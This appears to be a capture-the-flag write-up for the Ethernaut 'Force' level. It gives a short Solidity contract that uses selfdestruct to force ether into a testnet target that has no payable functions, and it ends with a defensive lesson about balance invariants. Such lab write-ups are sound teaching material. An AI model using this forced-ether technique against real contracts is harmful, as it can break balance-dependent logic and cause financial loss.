# 07. Force
<sup>Difficulty 5/10</sup>

Some contracts will simply not take your money `¯\_(ツ)_/¯`

The goal of this level is to make the balance of the contract greater than zero.

Things that might help:

- Fallback methods
- Sometimes the best way to attack a contract is with another contract.
- See the Help page above, section "Beyond the console"

## Solution

Amazing contract!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

We cannot transfer or send ETH to the contract, all transaction fails. Even the fallback method in this case is useless. We need to find a way to send money without trigger the receive function.

Selfdestruct method comes in help! 

From the [solidity docs](https://docs.soliditylang.org/en/develop/units-and-global-variables.html#contract-related):

> Destroy the current contract, sending its funds to the given Address and end execution. Note that selfdestruct has some peculiarities inherited from the EVM:
> - the receiving contract’s receive function is not executed.
> - the contract is only really destroyed at the end of the transaction and revert s might “undo” the destruction.

So we need to create a new contract, fund it with some ETH and then detroy it in favor of the hungry cat.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract FeedTheCat {
    address contractAddress = 0x3e5073183ED8C3B96dA7759001152fCa489d3f4B; // Force contract address

    function feedMe() public payable returns (bool success) {
        return true;
    }

    function feedCat() public {
        selfdestruct(payable(contractAddress)); // We need to transform the address to payable
    }
}
```

Fund it with some ETH and then call `feedCat` function

From Rinkeby Etherscan:
```
Contract 0x3e5073183ED8C3B96dA7759001152fCa489d3f4B 
Contract Overview
Balance: 0.001 Ether
```

Actually nice challenge.

## OZ Corner

In solidity, for a contract to be able to receive ether, the fallback function must be marked `payable`.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant `address(this).balance == 0` for any contract logic.
